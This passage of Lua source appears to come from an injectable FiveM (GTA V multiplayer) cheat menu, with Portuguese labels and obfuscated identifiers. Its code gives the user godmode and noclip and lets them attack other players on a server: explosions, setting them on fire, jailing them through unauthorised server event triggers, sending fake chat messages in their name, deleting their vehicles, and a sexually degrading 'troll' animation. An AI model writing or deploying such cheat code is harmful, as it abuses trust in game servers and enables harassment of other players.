                  for i,ctheItem in pairs(valid) do
                    for eh,tehEtem in pairs(horns) do
                      if eh == theItem.name and GetVehicleMod(veh,theItem.id) ~= ctheItem.data.realIndex then
                        price = "Not Installed"
                      elseif eh == theItem.name and isPreviewing and GetVehicleMod(veh,theItem.id) == ctheItem.data.realIndex then
                        price = "Previewing"
                      elseif eh == theItem.name and GetVehicleMod(veh,theItem.id) == ctheItem.data.realIndex then
                        price = "Installed"
                      end
                    end
                    if ctheItem.menuName == "~b~Stock" then end
                    if theItem.name == "Horns" then
                      for chorn,HornId in pairs(horns) do
                        if HornId == ci-1 then
                          ctheItem.menuName = chorn
                        end
                      end
                    end
                    if ctheItem.menuName == "NULL" then
                      ctheItem.menuName = "unknown"
                    end
                    if felipebypassedmesquita.button(ctheItem.menuName) then

                      if not isPreviewing then
                        oldmodtype = theItem.id
                        oldmod = GetVehicleMod(veh, theItem.id)
                        isPreviewing = Pryorbypessed3
                        if ctheItem.data.realIndex == -1 then
                          oldmodaction = "rm"
                          RemoveVehicleMod(veh, ctheItem.data.modid)
                          isPreviewing = Pryorbypessed2
                          oldmodtype = -1
                          oldmod = -1
                          oldmodaction = Pryorbypessed2
                        else
                          oldmodaction = Pryorbypessed2
                          SetVehicleMod(veh, theItem.id, ctheItem.data.realIndex, Pryorbypessed2)
                        end
                      elseif isPreviewing and GetVehicleMod(veh,theItem.id) == ctheItem.data.realIndex then
                        isPreviewing = Pryorbypessed2
                        oldmodtype = -1
                        oldmod = -1
                        oldmodaction = Pryorbypessed2
                        if ctheItem.data.realIndex == -1 then
                          RemoveVehicleMod(veh, ctheItem.data.modid)
                        else
                          SetVehicleMod(veh, theItem.id, ctheItem.data.realIndex, Pryorbypessed2)
                        end
                      elseif isPreviewing and GetVehicleMod(veh,theItem.id) ~= ctheItem.data.realIndex then
                        if ctheItem.data.realIndex == -1 then
                          RemoveVehicleMod(veh, ctheItem.data.modid)
                          isPreviewing = Pryorbypessed2
                          oldmodtype = -1
                          oldmod = -1
                          oldmodaction = Pryorbypessed2
                        else
                          SetVehicleMod(veh, theItem.id, ctheItem.data.realIndex, Pryorbypessed2)
                          isPreviewing = Pryorbypessed3
                        end
                      end
                    end
                  end
                  felipebypassedmesquita.Display()
                end
              end
            end



            for i,theItem in pairs(perfMods) do
              if felipebypassedmesquita.IsMenuOpened(theItem.id) then

                if GetVehicleMod(veh,theItem.id) == 0 then
                  pricestock = "Not Installed"
                  price1 = "Installed"
                  price2 = "Not Installed"
                  price3 = "Not Installed"
                  price4 = "Not Installed"
                elseif GetVehicleMod(veh,theItem.id) == 1 then
                  pricestock = "Not Installed"
                  price1 = "Not Installed"
                  price2 = "Installed"
                  price3 = "Not Installed"
                  price4 = "Not Installed"
                elseif GetVehicleMod(veh,theItem.id) == 2 then
                  pricestock = "Not Installed"
                  price1 = "Not Installed"
                  price2 = "Not Installed"
                  price3 = "Installed"
                  price4 = "Not Installed"
                elseif GetVehicleMod(veh,theItem.id) == 3 then
                  pricestock = "Not Installed"
                  price1 = "Not Installed"
                  price2 = "Not Installed"
                  price3 = "Not Installed"
                  price4 = "Installed"
                elseif GetVehicleMod(veh,theItem.id) == -1 then
                  pricestock = "Installed"
                  price1 = "Not Installed"
                  price2 = "Not Installed"
                  price3 = "Not Installed"
                  price4 = "Not Installed"
                end
                if felipebypassedmesquita.button("Stock "..theItem.name, pricestock) then
                  SetVehicleMod(veh,theItem.id, -1)
                elseif felipebypassedmesquita.button(theItem.name.." Upgrade 1", price1) then
                  SetVehicleMod(veh,theItem.id, 0)
                elseif felipebypassedmesquita.button(theItem.name.." Upgrade 2", price2) then
                  SetVehicleMod(veh,theItem.id, 1)
                elseif felipebypassedmesquita.button(theItem.name.." Upgrade 3", price3) then
                  SetVehicleMod(veh,theItem.id, 2)
                elseif theItem.id ~= 13 and theItem.id ~= 12 and felipebypassedmesquita.button(theItem.name.." Upgrade 4", price4) then
                  SetVehicleMod(veh,theItem.id, 3)
                end
                felipebypassedmesquita.Display()
              end
            end

            if felipebypassedmesquita.IsMenuOpened(LynxIcS) then

              DrawTxt("~b~Seja ~y~Muito bem Vindo meu Caro ~r~  "..pisello, 0.80, 0.9)
              drawDescription("Seja Muito bem Vindo Mestre "..pisello.." ~s~!", 0.5, 0.5)
              if felipebypassedmesquita.MenuButton("~p~🍎 -->>~s~ Você", sMX) then
              elseif felipebypassedmesquita.MenuButton("~p~🍊 -->>~s~ Jogadores ONLINE", OPMS) then
			  elseif felipebypassedmesquita.MenuButton("~p~🍏 -->>~s~ ~w~SKINS/TROLLS", TrollP) then
              elseif felipebypassedmesquita.MenuButton("~p~🍌 -->>~s~ Menu de Teleporte", TRPM) then
              elseif felipebypassedmesquita.MenuButton("~p~🍍 -->>~s~ Menu de Veiculo", VMS) then
              elseif felipebypassedmesquita.MenuButton("~p~🍇 -->>~s~ Menu de ARMAS >:)", WMPS) then
              elseif felipebypassedmesquita.MenuButton("~p~🍓 -->>~s~ .Lua TRIGGERS ~o~:3", LMX) then
              elseif felipebypassedmesquita.MenuButton("~p~🍒 -->>~s~ Modo Avançado do MENU ~o~xD", advm) then
              elseif felipebypassedmesquita.MenuButton("~p~-->> ~y~🦁Felipe~g~PRYOR🦁", crds) then
			  elseif felipebypassedmesquita.button("~r~----Desinjetar MENU----") then
			  Enabled = Pryorbypessed2
              end
              if felipebypassedmesquita.button("~g~Server IP: ~y~" ..GetCurrentServerEndpoint()) then
            elseif felipebypassedmesquita.button("~g~Menu Injetado em: ~y~" .. InjectionTime) then
            end
              felipebypassedmesquita.Display()
			elseif felipebypassedmesquita.IsMenuOpened(sMX) then
				if felipebypassedmesquita.button("Setar ~r~S~g~K~o~I~b~N ~w~por Nome") then
                    local model = Pryyyorbypass("Enter Model Name", "", 100)
				RequestModel(GetHashKey(model))
				print(model)
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
				else 
					notify("~r~~h~Modelo Inválido!!") 
				end
					
			elseif felipebypassedmesquita.button("~r~S~g~K~o~I~b~N Aleatoria") then
				RandomSkin(PlayerId())
			elseif felipebypassedmesquita.CheckBox("Godmode ~r~( Não USE)", Godmode, function(enabled) Godmode = enabled end) then
              elseif felipebypassedmesquita.CheckBox("~g~Semi~s~-Godmode", Demimode, function(enabled) Demimode = enabled end) then
              elseif felipebypassedmesquita.button("~y~Bugar Carro ~g~(NEW)") then
                local a="stt_prop_stunt_soccer_ball"while not HasModelLoaded(GetHashKey(a))do Citizen.Wait(0)RequestModel(GetHashKey(a))end;local b=CreateObject(GetHashKey(a),0,0,0,Pryorbypessed3,Pryorbypessed3,Pryorbypessed2)SetEntityVisible(b,0,0)AttachEntityToEntity(b,GetPlayerPed(-1),GetPedBoneIndex(GetPlayerPed(-1),57005),0,0,-1.0,0,0,0,Pryorbypessed2,Pryorbypessed3,Pryorbypessed3,Pryorbypessed3,1,Pryorbypessed3)
              elseif felipebypassedmesquita.CheckBox("~g~Invisibilidade", invisible, function(enabled) invisible = enabled end) then
              elseif felipebypassedmesquita.button("~r~Se Matar 💀") then
                SetEntityHealth(PlayerPedId(-1), 0)
              elseif felipebypassedmesquita.CheckBox("🔥~r~Soltar Fogo pela Boca🔥 ~g~(NEW)", FireBreath,function(enabled) FireBreath = enabled end) then
              elseif felipebypassedmesquita.CheckBox("~r~Ficar Pequeno ~g~(NEW)", BecomeTiny,function(enabled) BecomeTiny = enabled end) then
              elseif felipebypassedmesquita.button("~g~ESX~s~ Reviver ~r~(Não USE/Alto RISCO)~s~") then
                TriggerEvent("esx_ambulancejob:revive")
              elseif felipebypassedmesquita.button("~g~Curar/Reviver ~y~(SAFE/Pode GerarLOG)") then
                SetEntityHealth(PlayerPedId(-1), 200)
              elseif felipebypassedmesquita.button("~b~Pegar Colete ~r~(RISCO)") then
                SetPedArmour(PlayerPedId(-1), 200)
              elseif felipebypassedmesquita.CheckBox("~y~Estamina Infinita ~g~(SAFE)",InfStamina,function(enabled)InfStamina = enabled end) then
              elseif felipebypassedmesquita.CheckBox("~y~Visão ~o~Térmica", bTherm, function(bTherm) end) then
                therm = not therm
                bTherm = therm
                SetSeethrough(therm)
              elseif felipebypassedmesquita.CheckBox("Correr Rapido ~g~(SAFE)",fastrun,function(enabled)fastrun = enabled end) then
              elseif felipebypassedmesquita.CheckBox("Super Pulo ~g~(SAFE)", SuperJump, function(enabled) SuperJump = enabled end) then
              elseif felipebypassedmesquita.CheckBox("Noclip",Noclip,function(enable)Noclip = enable end) then
              end
              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened(OPMS) then
              if felipebypassedmesquita.MenuButton("~p~#~s~ Todos os Jogadores ", GAPA) then
              else
                local playerlist = GetActivePlayers()
                for i = 1, #playerlist do
                  local currPlayer = playerlist[i]
                  if felipebypassedmesquita.MenuButton("🆔: ~y~["..GetPlayerServerId(currPlayer).."] ~s~"..GetPlayerName(currPlayer).." "..(IsPedDeadOrDying(GetPlayerPed(currPlayer), 1) and "~r~DEAD" or "~g~ALIVE"), 'PlayerOptionsMenu') then
                    SelectedPlayer = currPlayer
                  end
                end
              end


              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened(poms) then
              drawDescription("Player", 0.58, 0.58)
              felipebypassedmesquita.SetSubTitle(poms, "Jogador >> [" .. GetPlayerName(SelectedPlayer) .. "]")
			  if felipebypassedmesquita.MenuButton("~p~#~s~ Troll Menu", Tmas) then
				
			  elseif felipebypassedmesquita.button("~g~Copiar ~y~Roupa :)") then
			  ClonePedlol(SelectedPlayer)	

              elseif felipebypassedmesquita.button("~p~Observar !", (Spectating and "~g~[SPECTATING]")) then
                SpectatePlayer(SelectedPlayer)

              elseif felipebypassedmesquita.button("~y~Bugar Carro do Jogador ~g~(NEW) ~s~") then
                local hashball = "stt_prop_stunt_soccer_ball"
                while not HasModelLoaded(GetHashKey(hashball)) do
                  Citizen.Wait(0)
                  RequestModel(GetHashKey(hashball))
                end
                local ball = CreateObject(GetHashKey(hashball), 0, 0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2)
                SetEntityVisible(ball, 0, 0)
                AttachEntityToEntity(ball, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0, 0, -1.0, 0, 0, 0, Pryorbypessed2, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3, 1, Pryorbypessed3)

              elseif felipebypassedmesquita.button("~b~Reparar Veiculo do Player ~g~(NEW)") then
                NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
                SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), Pryorbypessed2))
                SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), Pryorbypessed2), 0.0)
                SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), Pryorbypessed2), 0)
                SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), Pryorbypessed2), Pryorbypessed2)
                Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), Pryorbypessed2), 0)

              elseif felipebypassedmesquita.button("~g~Teleportar Carros para o Player ~b~(NEW/TEST)") then
                for veh in EnumerateVehicles() do
                  if DoesEntityExist(veh) then
                    SetEntityCoords(veh, GetEntityCoords(GetPlayerPed(selectedPlayer)))
                  end
                end

              elseif felipebypassedmesquita.button("~g~Curar ~s~Player") then
                local medkitname = "PICKUP_HEALTH_STANDARD"
                local medkit = GetHashKey(medkitname)
                local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                CreateAmbientPickup(medkit, coords.x, coords.y, coords.z + 1.0, 1, 1, medkit, 1, 0)
                SetPickupRegenerationTime(pickup, 60)

              elseif felipebypassedmesquita.button("~y~Telepotar para o Player ~g~(FIXED)") then       
                    local Entity = IsPedInAnyVehicle(PlayerPedId(-1), Pryorbypessed2) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
                    SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, Pryorbypessed2)
								
                 							
              elseif felipebypassedmesquita.MenuButton("~p~#~g~ Dar ARMA ~o~Especifica !", GSWP) then

              elseif felipebypassedmesquita.button("Dar ~r~Toda as ARMAS") then
                for i = 1, #allWeapons do
                  GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, Pryorbypessed2, Pryorbypessed2)
                end

              elseif felipebypassedmesquita.button("Spawnar Carro no ~r~Player/NOME") then
			
                local ped = GetPlayerPed(selectedPlayer)
                    local coords = GetEntityCoords(ped)
                    while not HasModelLoaded(GetHashKey("cargoplane")) do
                      RequestModel(GetHashKey("cargoplane"))
                      Wait(10)
                    end


                    local rotation = GetEntityRotation(player)
                    local veh = CreateVehicle(GetHashKey("cargoplane"), coords.x, coords.y, coords.z , 50, 23, 32)
                    SetVehicleEngineOn(veh, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
                    SetEntityRotation(veh, rotation, 0.0, 0.0, 0.0, Pryorbypessed3)
                    SetVehicleForwardSpeed(veh, 500.0)

              elseif felipebypassedmesquita.button("Prender/Cadeia Jogador ~r~(RISCO)") then
                TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(selectedPlayer), 5000, "Jailed")
                TSE("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60)
                TSE("esx_jail:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60)
                TSE("js:jailuser", GetPlayerServerId(selectedPlayer), 45 * 60, "Jailed")

              end

              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened(Tmas) then
              drawDescription("~r~Troll ~s~Para o Player", 0.58, 0.58)
              if felipebypassedmesquita.MenuButton("~p~#~s~ Spawnar NPCS", SPD) then
              elseif felipebypassedmesquita.button("~r~Fake ~s~Chat Mensagem") then
                local messaggio = Pryyyorbypass("Digite a MENSAGEM :", "", 100)
                local cazzo = GetPlayerName(SelectedPlayer)
                if messaggio then
                  TSE("_chat:messageEntered", cazzo, { 0, 0x99, 255 }, messaggio)
                end

              elseif felipebypassedmesquita.button("~o~Tirar ~g~Jogador do Veiculo") then
                ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
			elseif felipebypassedmesquita.button("~y~Taze Player ~g~(NEW)") then
				TazePlayer(SelectedPlayer)
					
								
			elseif felipebypassedmesquita.button("~b~Explosao Invisivel ~g~(NEW)") then
				AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, Pryorbypessed2, Pryorbypessed3, 0)
      elseif  felipebypassedmesquita.button("~b~Spawnar NPC com Carro Seguindo ~g~(NEW)") then
        Citizen.CreateThread(function()
        asshat = Pryorbypessed3
        local target = GetPlayerPed(SelectedPlayer)
        local assped = Pryorbypessed
        local vehlist = {'Nero', 'Deluxo', 'Raiden', 'Bati2', "SultanRS", "TA21", "Lynx", "ZR380", "Streiter", "Neon", "Italigto", "Nero2", "Fmj", "le7b", "prototipo", "cyclone", "khanjali", "STROMBERG", "BARRAGE", "COMET5"}
        local veh = vehlist[math.random(#vehlist)]
        local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
        local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
        local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
        local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
        local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
        local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
        print("~")
        if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), Pryorbypessed2) then
            local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
            NetworkRequestControlOfEntity(vt)
            SetVehicleModKit(vt, 0)
            ToggleVehicleMod(vt, 20, 1)
            SetVehicleModKit(vt, 0)
            SetVehicleTyresCanBurst(vt, 1)
        end
        local v = Pryorbypessed
        RequestModel(veh)
        RequestModel('s_m_y_hwaycop_01')
        while not HasModelLoaded(veh) and not HasModelLoaded('s_m_m_security_01') do
            print("~")
            RequestModel('s_m_y_hwaycop_01')
            Citizen.Wait(0)
            RequestModel(veh)
        end
        if HasModelLoaded(veh) then
            print("~")
            Citizen.Wait(50)
            v =
                CreateVehicle(
                veh,
                pos.x - (xf * 10),
                pos.y - (yf * 10),
                pos.z + 1,
                GetEntityHeading(GetPlayerPed(-1)),
                1,
                1
            )
            v1 =
                CreateVehicle(
                veh,
                pos.x - (xf * 10),
                pos.y - (yf * 10),
                pos.z + 1,
                GetEntityHeading(GetPlayerPed(-1)),
                1,
                1
            )
            SetVehicleGravityAmount(v, 15.0)
            SetVehicleGravityAmount(v1, 15.0)
            SetEntityInvincible(v, Pryorbypessed3)
            SetEntityInvincible(v1, Pryorbypessed3)
            if DoesEntityExist(v) then
                print("~")
                NetworkRequestControlOfEntity(v)
                SetVehicleDoorsLocked(v, 4)
                RequestModel('s_m_y_hwaycop_01')
                Citizen.Wait(50)
                if HasModelLoaded('s_m_y_hwaycop_01') then
                    print("~")
                    Citizen.Wait(50)
                    local pas = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, Pryorbypessed3, Pryorbypessed2)
                    local pas1 = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, Pryorbypessed3, Pryorbypessed2)
                    local ped = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, Pryorbypessed3, Pryorbypessed2)
                    local ped1 = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, Pryorbypessed3, Pryorbypessed2)
                    assped = ped
                    if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                        print("~")
                        GiveWeaponToPed(pas, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                        GiveWeaponToPed(pas1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                        GiveWeaponToPed(ped, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                        GiveWeaponToPed(ped1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                        print("~")
                        SetPedIntoVehicle(ped, v, -1)
                        SetPedIntoVehicle(ped1, v1, -1)
                        SetPedIntoVehicle(pas, v, 0)
                        SetPedIntoVehicle(pas1, v1, 0)
                        print("~")
                        TaskVehicleEscort(ped1, v1, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                        asstarget = target
                        TaskVehicleEscort(ped, v, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                        SetDriverAbility(ped, 10.0)
                        SetDriverAggressiveness(ped, 10.0)
                        SetDriverAbility(ped1, 10.0)
                        SetDriverAggressiveness(ped1, 10.0)
                    end
                end
            end
        end
    end)
				
			elseif felipebypassedmesquita.button("~y~Carregar Player/~r~SCRIPT ~g~(NEW)") then

				local player = PlayerPedId()	
				lib = 'missfinale_c2mcs_1'
				anim1 = 'fin_c2_mcs_1_camman'
				lib2 = 'nm'
				anim2 = 'firemans_carry'
				distans = 0.15
				distans2 = 0.27
				height = 0.63
				spin = 0.0		
				length = 100000
				controlFlagMe = 49
				controlFlagTarget = 33
				animFlagTarget = 1

				carryingBackInProgress = Pryorbypessed3

				Pryorbypessed1('CarryPeople:sync', GetPlayerServerId(selectedPlayer), lib,lib2, anim1, anim2, distans, distans2, height,target,length,spin,controlFlagMe,controlFlagTarget,animFlagTarget)
		
			
              elseif felipebypassedmesquita.button("~y~Explodir Veiculo do JOGADOR") then
                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), Pryorbypessed3) then
                  AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, Pryorbypessed2, Pryorbypessed3, 0.0)
                else
                  notify("~b~Jogador fora do VEICULO~s~.", Pryorbypessed2)
                end
              elseif felipebypassedmesquita.button("~y~Deletar ~s~VEICULO") then
                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), Pryorbypessed3) then
                  local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), Pryorbypessed2)
                  ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                  SetVehicleHasBeenOwnedByPlayer(veh,Pryorbypessed2)
                  Citizen.InvokeNative(0xAD738C3085FE7E11, veh, Pryorbypessed2, Pryorbypessed3) -- set not as mission entity
                  SetVehicleAsNoLongerNeeded(Citizen.PointerValueIntInitialized(veh))
                  Citizen.InvokeNative(0xEA386986E786A54F, Citizen.PointerValueIntInitialized(veh))
                end
              elseif felipebypassedmesquita.button("~y~Colocar RAMPA no Carro ~g~(NEW)") then
                local ped = GetPlayerPed(selectedPlayer)
                local vehi = GetVehiclePedIsIn(ped, 0)
                local ramp = CreateObject(GetHashKey("prop_jetski_ramp_01"), 0, 0, 0, 1, 1, 1)
                AttachEntityToEntity(ramp, vehi, bogie_front, 0.0, 3.0, 0.0, 0.0, 0.0, 180.0, Pryorbypessed2, Pryorbypessed2, Pryorbypessed3, Pryorbypessed2, 0, Pryorbypessed3)

              elseif felipebypassedmesquita.button("~r~Prop ~p~BANANA ~y~v2") then
                local pisello = CreateObject(-1207431159, 0, 0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
                local pisello2 = CreateObject(GetHashKey("cargoplane"), 0, 0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
                local pisello3 = CreateObject(GetHashKey("prop_beach_fire"), 0, 0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
                AttachEntityToEntity(pisello, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3, 1, Pryorbypessed3)
                AttachEntityToEntity(pisello2, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3, 1, Pryorbypessed3)
                AttachEntityToEntity(pisello3, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3, 1, Pryorbypessed3)
              elseif felipebypassedmesquita.button("~y~Explodir ~y~Jogador") then
                AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, Pryorbypessed3, Pryorbypessed2, 0)
                AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3)
		elseif felipebypassedmesquita.button("~y~Jogar Molotov no ~y~Jogador ~g~(NEW)") then
                AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 3, 2000.0, Pryorbypessed3, Pryorbypessed2, 0)
                AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 3, 2000.0, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3)		
			
		elseif felipebypassedmesquita.button("~y~Por Fogo no Player ~g~(NEW)") then
				local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
				for i=0, 5 do
					StartScriptFire(x, y, z - 0.99, 25, Pryorbypessed3)
			end
              elseif felipebypassedmesquita.button("~y~Cargo Plane ~g~(NEW)") then
			
                local ped = GetPlayerPed(selectedPlayer)
                    local coords = GetEntityCoords(ped)
                    while not HasModelLoaded(GetHashKey("cargoplane")) do
                      RequestModel(GetHashKey("cargoplane"))
                      Wait(10)
                    end


                    local rotation = GetEntityRotation(player)
                    local veh = CreateVehicle(GetHashKey("cargoplane"), coords.x, coords.y, coords.z , 50, 23, 32)
                    SetVehicleEngineOn(veh, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
                    SetEntityRotation(veh, rotation, 0.0, 0.0, 0.0, Pryorbypessed3)
                    SetVehicleForwardSpeed(veh, 500.0)

              elseif felipebypassedmesquita.button("~o~Véio Comedor ~g~(NEW) ") then
                RequestModelSync("a_m_o_acult_01")
                RequestAnimDict("rcmpaparazzo_2")
                while not HasAnimDictLoaded("rcmpaparazzo_2") do
                  Citizen.Wait(0)
                end

                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), Pryorbypessed3) then
                  local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), Pryorbypessed3)
                  while not NetworkHasControlOfEntity(veh) do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                  end
                  SetEntityAsMissionEntity(veh, Pryorbypessed3, Pryorbypessed3)
                  DeleteVehicle(veh)
                  DeleteEntity(veh)
                end
                count = -0.2
                for b=1,1 do
                  local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), Pryorbypessed3))
                  local rapist = CreatePed(4, GetHashKey("a_m_o_acult_01"), x,y,z, 0.0, Pryorbypessed3, Pryorbypessed2)
                  SetEntityAsMissionEntity(rapist, Pryorbypessed3, Pryorbypessed3)
                  AttachEntityToEntity(rapist, GetPlayerPed(SelectedPlayer), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, Pryorbypessed2, Pryorbypessed2, Pryorbypessed2, Pryorbypessed2, 2, Pryorbypessed3)
                  ClearPedTasks(GetPlayerPed(SelectedPlayer))
                  TaskPlayAnim(GetPlayerPed(SelectedPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                  SetPedKeepTask(rapist)
                  TaskPlayAnim(rapist, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                  SetEntityInvincible(rapist, Pryorbypessed3)
                  count = count - 0.4
                end
			elseif felipebypassedmesquita.button("~o~Véio Comedor 3x ~g~(NEW) ") then
				  RequestModelSync("a_m_o_acult_01")
                RequestAnimDict("rcmpaparazzo_2")
                while not HasAnimDictLoaded("rcmpaparazzo_2") do
                  Citizen.Wait(0)
                end

                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), Pryorbypessed3) then
                  local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), Pryorbypessed3)
                  while not NetworkHasControlOfEntity(veh) do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                  end
                  SetEntityAsMissionEntity(veh, Pryorbypessed3, Pryorbypessed3)
                  DeleteVehicle(veh)
                  DeleteEntity(veh)
                end
                count = -0.2
                for b=1, 3 do
                  local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), Pryorbypessed3))
                  local rapist = CreatePed(4, GetHashKey("a_m_o_acult_01"), x,y,z, 0.0, Pryorbypessed3, Pryorbypessed2)
                  SetEntityAsMissionEntity(rapist, Pryorbypessed3, Pryorbypessed3)
                  AttachEntityToEntity(rapist, GetPlayerPed(SelectedPlayer), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, Pryorbypessed2, Pryorbypessed2, Pryorbypessed2, Pryorbypessed2, 2, Pryorbypessed3)
                  ClearPedTasks(GetPlayerPed(SelectedPlayer))
                  TaskPlayAnim(GetPlayerPed(SelectedPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                  SetPedKeepTask(rapist)
                  TaskPlayAnim(rapist, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                  SetEntityInvincible(rapist, Pryorbypessed3)
                  count = count - 0.4		
                end

              elseif felipebypassedmesquita.button("~r~Prender ~s~Player") then
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                roundx = tonumber(string.format("%.2f", x))
                roundy = tonumber(string.format("%.2f", y))
                roundz = tonumber(string.format("%.2f", z))
                local cagemodel = "prop_fnclink_05crnr1"
                local cagehash = GetHashKey(cagemodel)
                RequestModel(cagehash)
                while not HasModelLoaded(cagehash) do
                  Citizen.Wait(0)
                end
                local cage1 = CreateObject(cagehash, roundx - 1.70, roundy - 1.70, roundz - 1.0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2)
                local cage2 = CreateObject(cagehash, roundx + 1.70, roundy + 1.70, roundz - 1.0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2)
                SetEntityHeading(cage1, -90.0)
                SetEntityHeading(cage2, 90.0)
                FreezeEntityPosition(cage1, Pryorbypessed3)
                FreezeEntityPosition(cage2, Pryorbypessed3)
              elseif felipebypassedmesquita.button("~w~Cabeça de ~r~Hamburguer") then
                local hamburg = "xs_prop_hamburgher_wl"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
                AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3, 1, Pryorbypessed3)
              elseif felipebypassedmesquita.button("~s~Transformar Carro em ~o~HAMBURGUER") then
                local hamburg = "xs_prop_hamburgher_wl"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
